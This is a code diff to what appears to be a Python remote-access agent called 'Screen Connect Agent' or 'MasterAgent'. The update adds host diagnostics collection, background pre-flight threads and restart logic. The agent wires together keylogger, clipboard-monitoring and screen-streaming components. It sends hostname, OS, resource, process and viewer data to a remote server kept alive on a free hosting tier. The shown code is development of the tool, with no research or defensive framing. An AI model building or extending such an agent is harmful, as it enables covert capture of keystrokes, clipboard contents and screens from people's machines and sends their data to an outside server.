+                        "agent_version":CONFIG["AGENT_VERSION"],
+                        "server_url":   CONFIG["SERVER_URL"],
+                        "hostname":     socket.gethostname(),
+                        "os":           platform.version(),
+                        "cpu_per_core": cpu,
+                        "ram_pct":      vm.percent,
+                        "ram_used_gb":  round(vm.used / (1024**3), 2),
+                        "disk_pct":     disk.percent,
+                        "net_sent_mb":  round(net.bytes_sent / (1024**2), 1),
+                        "net_recv_mb":  round(net.bytes_recv / (1024**2), 1),
+                        "process_count":procs,
+                        "thread_count": threads,
+                        "stream_fps":   CONFIG.get("STREAM_FPS"),
+                        "stream_q":     CONFIG.get("STREAM_QUALITY"),
+                        "stream_mon":   CONFIG.get("STREAM_MONITOR"),
+                        "adv_authed":   _adv_authed,
+                        "adv_viewers":  _adv_viewers,
+                        "ts":           datetime.utcnow().isoformat(),
+                    }
+                    sio.emit("diagnostics_result", bundle)
+                except Exception as e:
+                    sio.emit("diagnostics_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "error": str(e)
+                    })
+            threading.Thread(target=_collect, daemon=True, name="diag").start()
 
     # ── Main Run Loop ─────────────────────────────────────────────────────
     def run(self):
         log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
+        # ── v14: Load persisted config ──
+        _load_config_secure()
         if CONFIG["DEVICE_TOKEN"] == "UNSET-RUN-VIA-SERVER":
             log.warning("="*60)
             log.warning("DEVICE_TOKEN is not set! Run with a real token:")
@@ -4382,11 +4878,15 @@ class ScreenConnectAgent:
         # Note: start_advanced_monitor() is now called inside the connect() event
         # handler so the main socket registers agent_connect first (race fix)
         time.sleep(CONFIG["STARTUP_DELAY"])
+        # ── v14: Pre-flight diagnostics ──
+        threading.Thread(target=_preflight_check, daemon=True, name="preflight-boot").start()
 
         while not self._stop_flag.is_set():
             sio = sys_monitor = heartbeat = keylogger = clipboard = alerts = None
+            quality_rep = net_detector = None
             try:
-                sio, sys_monitor, heartbeat, keylogger, clipboard, alerts = self._make_client()
+                sio, sys_monitor, heartbeat, keylogger, clipboard, alerts, \
+                    quality_rep, net_detector = self._make_client()
                 
                 # FIX: Force http if connecting to a local IP to avoid common SSL/TLS errors in local dev
                 url = CONFIG["SERVER_URL"]
@@ -4407,7 +4907,8 @@ class ScreenConnectAgent:
             except Exception as e:
                 log.error(f"Agent error: {e}")
             finally:
-                for comp in [sys_monitor, heartbeat, keylogger, clipboard, alerts]:
+                for comp in [sys_monitor, heartbeat, keylogger, clipboard, alerts,
+                              quality_rep, net_detector]:
                     try:
                         if comp and hasattr(comp, "stop"):
                             comp.stop()
@@ -4439,10 +4940,10 @@ def _watchdog(agent_thread_ref: list):
        (Render free tier spins down after 15min inactivity)
     4. Clean PID file on clean exit
     """
-    time.sleep(60)
+    time.sleep(30)
     _last_keepalive = 0.0
     while True:
-        time.sleep(30)
+        time.sleep(15)  # v10: check every 15s (was 30s)
         now = time.monotonic()
 
         # ── Keep Render server awake every 10 min ─────────────────────────
@@ -4555,7 +5056,8 @@ if __name__ == "__main__":
 
     log.info(
         f"═══ MasterAgent v{CONFIG.get('AGENT_VERSION','?')} starting "
-        f"| host={socket.gethostname()} | pid={os.getpid()} ═══"
+        f"| host={socket.gethostname()} | pid={os.getpid()}"
+        f"| server={CONFIG['SERVER_URL']} | device={CONFIG['DEVICE_TOKEN'][:12]}... ═══"
     )
 
     agent        = ScreenConnectAgent()
